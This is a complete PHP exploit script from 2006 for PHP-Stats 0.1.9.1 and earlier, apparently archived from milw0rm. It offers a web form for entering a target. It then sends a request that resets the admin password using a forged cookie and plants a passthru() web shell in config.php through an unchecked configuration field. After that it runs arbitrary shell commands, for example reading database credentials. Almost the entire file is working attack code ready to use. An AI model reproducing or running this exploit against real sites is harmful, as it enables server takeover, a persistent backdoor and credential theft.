<?php
#  ---php_stats_0191_xpl.php                                04/03/2006 4.53.41 #
#                                                                              #
#               PHP-Stats <= 0.1.9.1 option[admin_pass] overwrite /            #
#                   / remote commands execution exploit                        #
#                              coded by rgod                                   #
#                     site: http://retrogod.altervista.org                     #
#                                                                              #
#  -> works regardless of magic_quotes_gpc settings...                         #
#  usage: launch from Apache, fill in requested fields, then go!               #
#                                                                              #
#  Sun-Tzu:"Of old, the rise of the Yin dynasty was due to I Chih who had      #
#  served under the Hsia.  Likewise, the rise of the Chou dynasty was due to   #
#  Lu Ya who had served under the Yin."                                        #

error_reporting(0);
ini_set("max_execution_time",0);
ini_set("default_socket_timeout",5);
ob_implicit_flush (1);

echo'<html><head><title>***** PHP-Stats <= 0.1.9.1 remote commands execution****
</title><meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
<style type="text/css"> body {background-color:#111111;   SCROLLBAR-ARROW-COLOR:
#ffffff; SCROLLBAR-BASE-COLOR: black; CURSOR: crosshair; color:  #1CB081; }  img
{background-color:   #FFFFFF   !important}  input  {background-color:    #303030
!important} option {  background-color:   #303030   !important}         textarea
{background-color: #303030 !important} input {color: #1CB081 !important}  option
{color: #1CB081 !important} textarea {color: #1CB081 !important}        checkbox
{background-color: #303030 !important} select {font-weight: normal;       color:
#1CB081;  background-color:  #303030;}  body  {font-size:  8pt       !important;
background-color:   #111111;   body * {font-size: 8pt !important} h1 {font-size:
0.8em !important}   h2   {font-size:   0.8em    !important} h3 {font-size: 0.8em
!important} h4,h5,h6    {font-size: 0.8em !important}  h1 font {font-size: 0.8em
!important} 	h2 font {font-size: 0.8em !important}h3   font {font-size: 0.8em
!important} h4 font,h5 font,h6 font {font-size: 0.8em !important} * {font-style:
normal !important} *{text-decoration: none !important} a:link,a:active,a:visited
{ text-decoration: none ; color : #99aa33; } a:hover{text-decoration: underline;
color : #999933; } .Stile5 {font-family: Verdana, Arial, Helvetica,  sans-serif;
font-size: 10px; } .Stile6 {font-family: Verdana, Arial, Helvetica,  sans-serif;
font-weight:bold; font-style: italic;}--></style></head><body><p class="Stile6">
***** PHP-Stats <= 0.1.9.1 remote commands execution**** </p><p class="Stile6">a
script  by  rgod  at    <a href="http://retrogod.altervista.org"target="_blank">
http://retrogod.altervista.org</a></p><table width="84%"><tr><td    width="43%">
<form name="form1" method="post"   action="'.$_SERVER[PHP_SELF].'">    <p><input
type="text"  name="host"> <span class="Stile5">* target    (ex:www.sitename.com)
</span></p> <p><input type="text" name="path">  <span class="Stile5">* path (ex:
/stats/ or just / ) </span></p><p><input type="text" name="cmd">           <span
class="Stile5">* specify a command ("cat config.php" to see database username  &
password...)</span></p><p><input   type="text" name="port"><span class="Stile5">
specify  a  port other than  80 (default value) </span></p><p><input type="text"
name="proxy"><span class="Stile5">send  exploit through an HTTP proxy  (ip:port)
</span></p><p> <input type="submit" name="Submit" value="go!"></p> </form> </td>
</tr></table></body></html>';

function show($headeri)
{
  $ii=0;$ji=0;$ki=0;$ci=0;
  echo '<table border="0"><tr>';
  while ($ii <= strlen($headeri)-1){
    $datai=dechex(ord($headeri[$ii]));
    if ($ji==16) {
      $ji=0;
      $ci++;
      echo "<td>&nbsp;&nbsp;</td>";
      for ($li=0; $li<=15; $li++) {
        echo "<td>".htmlentities($headeri[$li+$ki])."</td>";
		}
      $ki=$ki+16;
      echo "</tr><tr>";
    }
    if (strlen($datai)==1) {
      echo "<td>0".htmlentities($datai)."</td>";
    }
    else {
      echo "<td>".htmlentities($datai)."</td> ";
    }
    $ii++;$ji++;
  }
  for ($li=1; $li<=(16 - (strlen($headeri) % 16)+1); $li++) {
    echo "<td>&nbsp&nbsp</td>";
  }
  for ($li=$ci*16; $li<=strlen($headeri); $li++) {
    echo "<td>".htmlentities($headeri[$li])."</td>";
  }
  echo "</tr></table>";
}

$proxy_regex = '(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b)';

function sendpacket() //2x speed
{
  global $proxy, $host, $port, $packet, $html, $proxy_regex;
  $socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
  if ($socket < 0) {
    echo "socket_create() failed: reason: " . socket_strerror($socket) . "<br>";
  }
  else {
    $c = preg_match($proxy_regex,$proxy);
    if (!$c) {echo 'Not a valid proxy...';
    die;
    }
  echo "OK.<br>";
  echo "Attempting to connect to ".$host." on port ".$port."...<br>";
  if ($proxy=='') {
    $result = socket_connect($socket, $host, $port);
  }
  else {
    $parts =explode(':',$proxy);
    echo 'Connecting to '.$parts[0].':'.$parts[1].' proxy...<br>';
    $result = socket_connect($socket, $parts[0],$parts[1]);
  }
  if ($result < 0) {
    echo "socket_connect() failed.\r\nReason: (".$result.") " . socket_strerror($result) . "<br><br>";
  }
  else {
    echo "OK.<br><br>";
    $html= '';
    socket_write($socket, $packet, strlen($packet));
    echo "Reading response:<br>";
    while ($out= socket_read($socket, 2048)) {$html.=$out;}
    echo nl2br(htmlentities($html));
    echo "Closing socket...";
    socket_close($socket);
  }
  }
}

function sendpacketii($packet)
{
  global $proxy, $host, $port, $html, $proxy_regex;
  if ($proxy=='') {
    $ock=fsockopen(gethostbyname($host),$port);
    if (!$ock) {
      echo 'No response from '.htmlentities($host); die;
    }
  }
  else {
	$c = preg_match($proxy_regex,$proxy);
    if (!$c) {
      echo 'Not a valid prozy...';die;
    }
    $parts=explode(':',$proxy);
    echo 'Connecting to '.$parts[0].':'.$parts[1].' proxy...<br>';
    $ock=fsockopen($parts[0],$parts[1]);
    if (!$ock) {
      echo 'No response from proxy...';die;
	}
  }
  fputs($ock,$packet);
  if ($proxy=='') {
    $html='';
    while (!feof($ock)) {
      $html.=fgets($ock);
    }
  }
  else {
    $html='';
    while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html))) {
      $html.=fread($ock,1);
    }
  }
  fclose($ock);echo nl2br(htmlentities($html));
}

if ( get_magic_quotes_gpc() ) {
   function stripslashes_deep($value) {
       $value = is_array($value) ? array_map('stripslashes_deep', $value) : stripslashes($value);
       return $value;
   }
   $_POST = stripslashes_deep($_POST);
}

$host=$_POST[host];$port=$_POST[port];$path=$_POST[path];
$cmd=$_POST[cmd];$cmd=urlencode($cmd);$proxy=$_POST[proxy];
echo "<span class=\"Stile5\">";

if (($host<>'') and ($path<>'') and ($cmd<>''))
{
    $port=intval(trim($port));
    if ($port=='') {$port=80;}
    if (($path[0]<>'/') or ($path[strlen($path)-1]<>'/')) {echo 'Error... check the path!'; die;}
    if ($proxy=='') {$p=$path;} else {$p='http://'.$host.':'.$port.$path;}
    $host=str_replace("\r","",$host);$host=str_replace("\n","",$host);
    $path=str_replace("\r","",$path);$path=str_replace("\n","",$path);

    $SHELL =';if (isset($_GET[cmd])){if (get_magic_quotes_gpc()){';
    $SHELL.='$_GET[cmd] = stripslashes($_GET[cmd]);';
    $SHELL.='}passthru($_GET[cmd]);}//';
    #exploit... overwrite option[] array
    #set a new admin password at run-time :)
    #*****************************************
    $data ="option=";
    $data.="&option[admin_pass]=suntzu";
    #****************************************
    $data.="&option_new[callviaimg]=1";
    $data.="&option_new[php_stats_safe]=0";
    $data.="&option_new[out_compress]=1";
    $data.="&option_new[persistent_conn]=0";
    $data.="&option_new[autorefresh]=3";
    $data.="&option_new[show_server_details]=1";
    $data.="&option_new[show_average_user]=0";
    $data.="&option_new[short_url]=1";
    $data.="&option_new[lock_not_valid_url]=0";
    $data.="&option_new[ext_whois]=";
    $data.="&option_new[online_timeout]=5";
    $data.="&option_new[page_title]=";
    $data.="&option_new[online_timeout]=5";
    $data.="&option_new[page_title]=1";
    $data.="&option_new[log_host]=0";
    $data.="&option_new[clear_cache]=0";
    $data.="&option_new[full_recn]=0";
    $data.="&option_new[logerrors]=1";
    $data.="&option_new[check_new_version]=1";
    $data.="&option_new[www_trunc]=0";
    $data.="&option_new[accept_ssi]=1";
    # inject some code in compatibility_mode argument...
    # you can use all values, they should be numeric
    # but they are not checked
    # and not delimited by quotes in config.php
    # so it works regardless of magic_quotes_gpc ...
    $data.="&option_new[compatibility_mode]=0".$SHELL;
    $data.="&option_new[ip-zone]=0";
    $data.="&option_new[down_mode]=0";
    $data.="&option_new[check_links]=1";
    $data.="&mode=modify";
    $packet ="POST ".$p."admin.php?action=modify_config HTTP/1.1\r\n";
    $packet.="User-Agent: John Constantine\r\n";
    $packet.="Content-Type: application/x-www-form-urlencoded\r\n";
    #******** the magic cookie ****************
    $packet.="Cookie: php_stats_cache=1; pass_cookie=".md5("suntzu").";\r\n";
    #******************************************
    $packet.="Host: ".$host."\r\n";
    $packet.="Content-Length: ".strlen($data)."\r\n";
    $packet.="Connection: Close\r\n\r\n";
    $packet.=$data;
    show($packet);
    sendpacketii($packet);

    $packet ="GET ".$p."config.php?cmd=".$cmd." HTTP/1.1\r\n";
    $packet.="User-Agent: URLBlaze\r\n";
    $packet.="Host: ".$host."\r\n";
    $packet.="Connection: Close\r\n\r\n";
    show($packet);
    sendpacketii($packet);
}
else
{echo "Fill * required fields, optionally specify a proxy...";}
echo "</span>";
?>

# milw0rm.com [2006-03-04]
